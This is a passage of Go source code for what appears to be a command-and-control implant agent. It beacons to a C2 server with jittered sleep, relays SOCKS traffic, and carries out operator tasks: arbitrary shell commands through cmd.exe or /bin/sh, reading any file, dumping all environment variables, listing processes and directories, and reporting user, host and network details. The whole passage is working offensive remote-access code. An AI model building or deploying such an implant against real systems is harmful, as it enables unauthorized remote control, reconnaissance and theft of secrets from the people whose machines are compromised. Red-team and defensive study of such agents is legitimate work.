			}

			postJSON, _ := json.Marshal(postMsg)
			postRespJSON, err := a.sendMessage(postJSON)
			if err != nil {
				continue
			}

			var postResp PostResponseResponse
			if err := json.Unmarshal(postRespJSON, &postResp); err != nil {
				continue
			}

			// Process any SOCKS data from post_response
			for _, dg := range postResp.Socks {
				a.socks.Route(dg)
			}
		}
	}
}

func (a *Agent) handleTask(task Task) TaskResponse {
	switch task.Command {
	case "shell":
		return a.shellTask(task)
	case "whoami":
		return a.whoamiTask(task)
	case "hostname":
		return a.hostnameTask(task)
	case "ps":
		return a.psTask(task)
	case "ls":
		return a.lsTask(task)
	case "cd":
		return a.cdTask(task)
	case "pwd":
		return a.pwdTask(task)
	case "cat":
		return a.catTask(task)
	case "ifconfig":
		return a.ifconfigTask(task)
	case "env":
		return a.envTask(task)
	case "sleep":
		return a.sleepTask(task)
	case "exit":
		os.Exit(0)
		return TaskResponse{}
	default:
		return TaskResponse{
			TaskID:     task.ID,
			UserOutput: fmt.Sprintf("Unknown command: %s", task.Command),
			Completed:  true,
			Status:     "error",
		}
	}
}

func (a *Agent) shellTask(task Task) TaskResponse {
	command := parseParam(task.Parameters, "command", "Command")
	if command == "" {
		return TaskResponse{TaskID: task.ID, UserOutput: "No command specified", Completed: true, Status: "error"}
	}
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe", "/C", command)
	} else {
		cmd = exec.Command("/bin/sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	result := string(output)
	if err != nil {
		result += "\n" + err.Error()
	}

	return TaskResponse{
		TaskID:     task.ID,
		UserOutput: result,
		Completed:  true,
		Status:     "completed",
	}
}

func (a *Agent) sleepTask(task Task) TaskResponse {
	var params struct {
		Interval *int     `json:"interval"`
		Jitter   *float64 `json:"jitter"`
	}
	if err := json.Unmarshal([]byte(task.Parameters), &params); err != nil {
		// Try parsing as plain number
		if interval, err := strconv.Atoi(strings.TrimSpace(task.Parameters)); err == nil {
			a.interval = interval
			return TaskResponse{
				TaskID:     task.ID,
				UserOutput: fmt.Sprintf("Sleep set to %ds / %.0f%%\n", a.interval, a.jitter),
				Completed:  true,
				Status:     "completed",
			}
		}
		return TaskResponse{TaskID: task.ID, UserOutput: "Invalid parameters", Completed: true, Status: "error"}
	}

	if params.Interval != nil {
		a.interval = *params.Interval
	}
	if params.Jitter != nil {
		a.jitter = *params.Jitter
	}

	return TaskResponse{
		TaskID:     task.ID,
		UserOutput: fmt.Sprintf("Sleep set to %ds / %.0f%%\n", a.interval, a.jitter),
		Completed:  true,
		Status:     "completed",
	}
}

func (a *Agent) whoamiTask(task Task) TaskResponse {
	currentUser, err := user.Current()
	if err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: err.Error(), Completed: true, Status: "error"}
	}

	hostname, _ := os.Hostname()
	groups, _ := currentUser.GroupIds()

	var sb strings.Builder
	fmt.Fprintf(&sb, "Username: %s\n", currentUser.Username)
	fmt.Fprintf(&sb, "UID:      %s\n", currentUser.Uid)
	fmt.Fprintf(&sb, "GID:      %s\n", currentUser.Gid)
	fmt.Fprintf(&sb, "Home:     %s\n", currentUser.HomeDir)
	fmt.Fprintf(&sb, "Hostname: %s\n", hostname)
	if len(groups) > 0 {
		fmt.Fprintf(&sb, "Groups:   %s\n", strings.Join(groups, ", "))
	}
	if os.Geteuid() == 0 {
		fmt.Fprintf(&sb, "Elevated: true (root)\n")
	}

	return TaskResponse{TaskID: task.ID, UserOutput: sb.String(), Completed: true, Status: "completed"}
}

func (a *Agent) hostnameTask(task Task) TaskResponse {
	hostname, err := os.Hostname()
	if err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: err.Error(), Completed: true, Status: "error"}
	}
	return TaskResponse{TaskID: task.ID, UserOutput: hostname + "\n", Completed: true, Status: "completed"}
}

func (a *Agent) psTask(task Task) TaskResponse {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("cmd.exe", "/C", "tasklist /FO CSV /NH")
		output, err := cmd.CombinedOutput()
		if err != nil {
			return TaskResponse{TaskID: task.ID, UserOutput: err.Error(), Completed: true, Status: "error"}
		}

		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("%-8s %-30s %-10s %-10s\n", "PID", "NAME", "SESSION", "MEM"))
		sb.WriteString(strings.Repeat("-", 60) + "\n")
		for _, line := range strings.Split(strings.TrimSpace(string(output)), "\n") {
			fields := parseCSVLine(line)
			if len(fields) >= 5 {
				sb.WriteString(fmt.Sprintf("%-8s %-30s %-10s %-10s\n", fields[1], fields[0], fields[2], fields[4]))
			}
		}
		return TaskResponse{TaskID: task.ID, UserOutput: sb.String(), Completed: true, Status: "completed"}
	}

	// Linux/macOS: read /proc
	entries, err := os.ReadDir("/proc")
	if err != nil {
		// Fallback to ps command
		cmd := exec.Command("ps", "aux")
		output, _ := cmd.CombinedOutput()
		return TaskResponse{TaskID: task.ID, UserOutput: string(output), Completed: true, Status: "completed"}
	}

	type procInfo struct {
		pid  int
		ppid string
		user string
		name string
		cmd  string
	}

	var procs []procInfo
	for _, entry := range entries {
		pid, err := strconv.Atoi(entry.Name())
		if err != nil {
			continue
		}

		p := procInfo{pid: pid}

		// Read comm (process name)
		if comm, err := os.ReadFile(fmt.Sprintf("/proc/%d/comm", pid)); err == nil {
			p.name = strings.TrimSpace(string(comm))
		}

		// Read status for PPid and owner
		if status, err := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid)); err == nil {
			for _, line := range strings.Split(string(status), "\n") {
				if strings.HasPrefix(line, "PPid:") {
					p.ppid = strings.TrimSpace(strings.TrimPrefix(line, "PPid:"))
				}
				if strings.HasPrefix(line, "Uid:") {
					fields := strings.Fields(line)
					if len(fields) >= 2 {
						if u, err := user.LookupId(fields[1]); err == nil {
							p.user = u.Username
						} else {
							p.user = fields[1]
						}
					}
				}
			}
		}

		// Read cmdline
		if cmdline, err := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid)); err == nil {
			p.cmd = strings.ReplaceAll(string(cmdline), "\x00", " ")
			p.cmd = strings.TrimSpace(p.cmd)
		}

		procs = append(procs, p)
	}

	sort.Slice(procs, func(i, j int) bool { return procs[i].pid < procs[j].pid })

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("%-8s %-8s %-12s %-20s %s\n", "PID", "PPID", "USER", "NAME", "CMD"))
	sb.WriteString(strings.Repeat("-", 80) + "\n")
	for _, p := range procs {
		cmd := p.cmd
		if len(cmd) > 50 {
			cmd = cmd[:50] + "..."
		}
		sb.WriteString(fmt.Sprintf("%-8d %-8s %-12s %-20s %s\n", p.pid, p.ppid, p.user, p.name, cmd))
	}

	return TaskResponse{TaskID: task.ID, UserOutput: sb.String(), Completed: true, Status: "completed"}
}

func (a *Agent) lsTask(task Task) TaskResponse {
	dir := parseParam(task.Parameters, "path", "Path")
	if dir == "" || dir == "." {
		dir, _ = os.Getwd()
	}

	entries, err := os.ReadDir(dir)
	if err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: err.Error(), Completed: true, Status: "error"}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Listing: %s\n\n", dir))
	sb.WriteString(fmt.Sprintf("%-12s %-10s %-20s %s\n", "PERMISSIONS", "SIZE", "MODIFIED", "NAME"))
	sb.WriteString(strings.Repeat("-", 70) + "\n")

	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			continue
		}

		size := fmt.Sprintf("%d", info.Size())
		if info.IsDir() {
			size = "<DIR>"
		}

		sb.WriteString(fmt.Sprintf("%-12s %-10s %-20s %s\n",
			info.Mode().String(),
			size,
			info.ModTime().Format("2006-01-02 15:04:05"),
			entry.Name(),
		))
	}

	return TaskResponse{TaskID: task.ID, UserOutput: sb.String(), Completed: true, Status: "completed"}
}

func (a *Agent) cdTask(task Task) TaskResponse {
	dir := parseParam(task.Parameters, "path", "Path")
	if dir == "" || dir == "~" {
		dir, _ = os.UserHomeDir()
	}

	if err := os.Chdir(dir); err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: err.Error(), Completed: true, Status: "error"}
	}

	cwd, _ := os.Getwd()
	return TaskResponse{TaskID: task.ID, UserOutput: "Changed directory to: " + cwd + "\n", Completed: true, Status: "completed"}
}

func (a *Agent) pwdTask(task Task) TaskResponse {
	cwd, err := os.Getwd()
	if err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: err.Error(), Completed: true, Status: "error"}
	}
	return TaskResponse{TaskID: task.ID, UserOutput: cwd + "\n", Completed: true, Status: "completed"}
}

func (a *Agent) catTask(task Task) TaskResponse {
	path := parseParam(task.Parameters, "path", "Path")
	if path == "" {
		return TaskResponse{TaskID: task.ID, UserOutput: "Usage: cat <file>", Completed: true, Status: "error"}
	}

	data, err := os.ReadFile(path)
	if err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: err.Error(), Completed: true, Status: "error"}
	}

	// Cap output at 1MB to avoid blowing up the C2 channel
	output := string(data)
	if len(output) > 1024*1024 {
		output = output[:1024*1024] + "\n\n[truncated at 1MB]"
	}

	return TaskResponse{TaskID: task.ID, UserOutput: output, Completed: true, Status: "completed"}
}

func (a *Agent) ifconfigTask(task Task) TaskResponse {
	ifaces, err := net.Interfaces()
	if err != nil {
		return TaskResponse{TaskID: task.ID, UserOutput: err.Error(), Completed: true, Status: "error"}
	}

	var sb strings.Builder
	for _, iface := range ifaces {
		fmt.Fprintf(&sb, "%s:\n", iface.Name)
		fmt.Fprintf(&sb, "  MAC:   %s\n", iface.HardwareAddr)
		fmt.Fprintf(&sb, "  Flags: %s\n", iface.Flags.String())
		fmt.Fprintf(&sb, "  MTU:   %d\n", iface.MTU)

		addrs, err := iface.Addrs()
		if err == nil {
			for _, addr := range addrs {
				fmt.Fprintf(&sb, "  Addr:  %s\n", addr.String())
			}
		}
		sb.WriteString("\n")
	}

	return TaskResponse{TaskID: task.ID, UserOutput: sb.String(), Completed: true, Status: "completed"}
}

func (a *Agent) envTask(task Task) TaskResponse {
	envVars := os.Environ()
	sort.Strings(envVars)
	return TaskResponse{TaskID: task.ID, UserOutput: strings.Join(envVars, "\n") + "\n", Completed: true, Status: "completed"}
}

func parseCSVLine(line string) []string {
	var fields []string
	var current strings.Builder
	inQuotes := false
	for _, r := range line {
		switch {
		case r == '"':
			inQuotes = !inQuotes
		case r == ',' && !inQuotes:
			fields = append(fields, current.String())
			current.Reset()
		default:
			current.WriteRune(r)
		}
	}
	fields = append(fields, current.String())
	return fields
}

func (a *Agent) sleep() {
	if a.interval <= 0 {
		// Poll mode for SOCKS - small delay to avoid CPU spin
		time.Sleep(50 * time.Millisecond)
		return
	}
	base := time.Duration(a.interval) * time.Second
	jitterRange := float64(base) * (a.jitter / 100.0)
	jitterAmount := time.Duration(mathrand.Float64() * jitterRange)
	time.Sleep(base + jitterAmount)
}

func getLocalIPs() []string {
	var ips []string
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return []string{"127.0.0.1"}
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				ips = append(ips, ipnet.IP.String())
			}
		}
	}
	if len(ips) == 0 {
		ips = []string{"127.0.0.1"}
	}
	return ips
}

func main() {
	agent := NewAgent()
	agent.Start()
}
